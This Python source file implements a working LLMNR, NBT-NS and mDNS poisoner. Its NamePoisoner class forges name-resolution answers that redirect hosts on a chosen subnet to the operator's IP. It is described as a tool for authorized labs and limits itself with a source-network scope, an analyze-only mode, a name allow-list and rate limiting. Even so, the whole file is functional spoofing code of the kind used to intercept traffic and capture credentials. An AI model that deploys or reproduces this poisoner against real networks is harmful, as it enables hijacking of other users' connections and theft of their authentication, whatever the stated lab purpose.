#!/usr/bin/env python3
"""Scoped IPv4 LLMNR, NBT-NS and mDNS responder for authorized labs.

The responder is intentionally not a recursive DNS server. It only answers
multicast/broadcast name queries from an explicitly configured source network.
"""
import ipaddress
import socket
import struct
import threading
import time


GROUPS = {
    "llmnr": ("224.0.0.252", 5355),
    "mdns": ("224.0.0.251", 5353),
}


def _dns_name(data, offset=12):
    labels = []
    start = offset
    while True:
        if offset >= len(data):
            raise ValueError("truncated DNS name")
        size = data[offset]
        offset += 1
        if size == 0:
            break
        if size & 0xC0:
            raise ValueError("compressed query name is not supported")
        if size > 63 or offset + size > len(data):
            raise ValueError("invalid DNS label")
        labels.append(data[offset:offset + size].decode("utf-8", "replace"))
        offset += size
    if offset + 4 > len(data):
        raise ValueError("truncated DNS question")
    qtype, qclass = struct.unpack("!HH", data[offset:offset + 4])
    return ".".join(labels), qtype, qclass, data[start:offset + 4]


def _dns_answer(query, listener_ip, protocol, ttl=30):
    if len(query) < 12:
        raise ValueError("truncated DNS header")
    txid, flags, qdcount = struct.unpack("!HHH", query[:6])
    if flags & 0x8000 or qdcount != 1:
        raise ValueError("not a single-question query")
    name, qtype, qclass, question = _dns_name(query)
    if qtype not in (1, 255) or (qclass & 0x7FFF) != 1:
        raise ValueError("query is not for an IPv4 address")
    response_flags = 0x8000 if protocol == "llmnr" else 0x8400
    header = struct.pack("!HHHHHH", txid, response_flags, 1, 1, 0, 0)
    answer_name = b"\xc0\x0c"
    answer = (answer_name + struct.pack("!HHIH", 1, 1, ttl, 4) +
              socket.inet_aton(listener_ip))
    return name, qclass, header + question + answer


def _decode_nb_name(encoded):
    if len(encoded) != 32:
        raise ValueError("invalid NetBIOS name length")
    raw = bytearray()
    for pos in range(0, 32, 2):
        hi = encoded[pos] - 0x41
        lo = encoded[pos + 1] - 0x41
        if not (0 <= hi <= 15 and 0 <= lo <= 15):
            raise ValueError("invalid NetBIOS name encoding")
        raw.append((hi << 4) | lo)
    return bytes(raw[:15]).decode("ascii", "replace").rstrip(), raw[15]


def _nbns_answer(query, listener_ip, ttl=30):
    if len(query) < 50:
        raise ValueError("truncated NBT-NS query")
    txid, flags, qdcount = struct.unpack("!HHH", query[:6])
    if flags & 0x8000 or qdcount != 1 or query[12] != 0x20:
        raise ValueError("not a single-name NBT-NS query")
    encoded = query[13:45]
    if query[45] != 0:
        raise ValueError("scoped NBT-NS names are not supported")
    qtype, qclass = struct.unpack("!HH", query[46:50])
    if qtype != 0x20 or qclass != 1:
        raise ValueError("unsupported NBT-NS question")
    name, suffix = _decode_nb_name(encoded)
    header = struct.pack("!HHHHHH", txid, 0x8500, 0, 1, 0, 0)
    resource = (query[12:46] + struct.pack("!HHIH", 0x20, 1, ttl, 6) +
                b"\x00\x00" + socket.inet_aton(listener_ip))
    return "%s<%02X>" % (name, suffix), header + resource


class NamePoisoner:
    """Run scoped name-resolution listeners and expose runtime TUI toggles."""

    def __init__(self, listener_ip, source_cidr, protocols, analyze=False,
                 allow_names=None, ttl=30):
        listener_address = ipaddress.ip_address(listener_ip)
        self.source_network = ipaddress.ip_network(source_cidr, strict=False)
        if listener_address.version != 4 or self.source_network.version != 4:
            raise ValueError("name poisoner currently supports IPv4 only")
        if self.source_network.prefixlen < 8:
            raise ValueError("--poison-cidr must use a prefix length of at least /8")
        self.listener_ip = str(listener_address)
        if listener_address not in self.source_network:
            raise ValueError("--poison-ip must belong to --poison-cidr")
        self.analyze = bool(analyze)
        self.ttl = ttl
        self.configured = set(protocols)
        self.enabled = {name: name in protocols
                        for name in ("llmnr", "nbns", "mdns")}
        self.allow_names = tuple(
            item.strip().lower().lstrip(".") for item in (allow_names or [])
            if item.strip())
        self.stop_event = threading.Event()
        self.sockets = []
        self.threads = []
        self.lock = threading.RLock()
        self.queries = 0
        self.answers = 0
        self._recent = {}

    def status(self):
        with self.lock:
            return "".join(name[0].upper() if self.enabled[name]
                           else name[0].lower()
                           for name in ("llmnr", "nbns", "mdns"))

    def toggle(self, protocol):
        with self.lock:
            if protocol not in self.configured:
                return
            self.enabled[protocol] = not self.enabled[protocol]
            state = "ON" if self.enabled[protocol] else "off"
        print("[poison] %s %s" % (protocol.upper(), state))

    def _allowed(self, source_ip, name):
        try:
            address = ipaddress.ip_address(source_ip)
        except ValueError:
            return False
        if address not in self.source_network or source_ip == self.listener_ip:
            return False
        if not self.allow_names:
            return True
        value = name.lower().rstrip(".")
        if len(value) > 4 and value[-4] == "<" and value[-1] == ">":
            value = value[:-4]
        return any(value == item or value.endswith("." + item)
                   for item in self.allow_names)

    def _rate_limited(self, protocol, source_ip, name):
        key = (protocol, source_ip, name.lower())
        now = time.monotonic()
        with self.lock:
            previous = self._recent.get(key, 0)
            self._recent[key] = now
            if len(self._recent) > 2048:
                cutoff = now - 30
                self._recent = {k: v for k, v in self._recent.items()
                                if v >= cutoff}
        return now - previous < 0.75

    def _make_socket(self, protocol):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,
                             socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if hasattr(socket, "SO_REUSEPORT"):
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except OSError:
                pass
        sock.settimeout(0.5)
        if protocol in GROUPS:
            group, port = GROUPS[protocol]
            sock.bind(("", port))
            membership = socket.inet_aton(group) + socket.inet_aton(
                self.listener_ip)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
                            membership)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF,
                            socket.inet_aton(self.listener_ip))
        else:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.bind(("", 137))
        return sock

    def start(self):
        started = []
        for protocol, active in self.enabled.items():
            if not active:
                continue
            try:
                sock = self._make_socket(protocol)
            except OSError as exc:
                with self.lock:
                    self.enabled[protocol] = False
                    self.configured.discard(protocol)
                print("[!] poison %s unavailable: %s" %
                      (protocol.upper(), exc))
                continue
            self.sockets.append(sock)
            thread = threading.Thread(target=self._run,
                                      args=(protocol, sock), daemon=True,
                                      name="poison-%s" % protocol)
            thread.start()
            self.threads.append(thread)
            started.append(protocol.upper())
        if started:
            mode = "ANALYZE" if self.analyze else "ACTIVE"
            print("[+] name poisoner %s on %s for %s (%s)" %
                  (mode, self.listener_ip, self.source_network,
                   ", ".join(started)))
        return bool(started)

    def _run(self, protocol, sock):
        while not self.stop_event.is_set():
            try:
                packet, address = sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            source_ip = address[0]
            try:
                if protocol == "nbns":
                    name, response = _nbns_answer(
                        packet, self.listener_ip, self.ttl)
                    destination = address
                else:
                    name, qclass, response = _dns_answer(
                        packet, self.listener_ip, protocol, self.ttl)
                    if protocol == "mdns" and not (qclass & 0x8000):
                        destination = GROUPS["mdns"]
                    else:
                        destination = address
            except ValueError:
                continue
            if not self._allowed(source_ip, name):
                continue
            with self.lock:
                active = self.enabled[protocol]
                if active:
                    self.queries += 1
            if not active:
                continue
            if self._rate_limited(protocol, source_ip, name):
                continue
            action = "observe"
            if active and not self.analyze:
                try:
                    sock.sendto(response, destination)
                    with self.lock:
                        self.answers += 1
                    action = "reply %s" % self.listener_ip
                except OSError as exc:
                    action = "send failed: %s" % exc
            print("[poison] [%s] %s from %s -> %s" %
                  (protocol.upper(), name, source_ip, action))

    def close(self):
        self.stop_event.set()
        for sock in self.sockets:
            try:
                sock.close()
            except OSError:
                pass
        for thread in self.threads:
            thread.join(timeout=1)
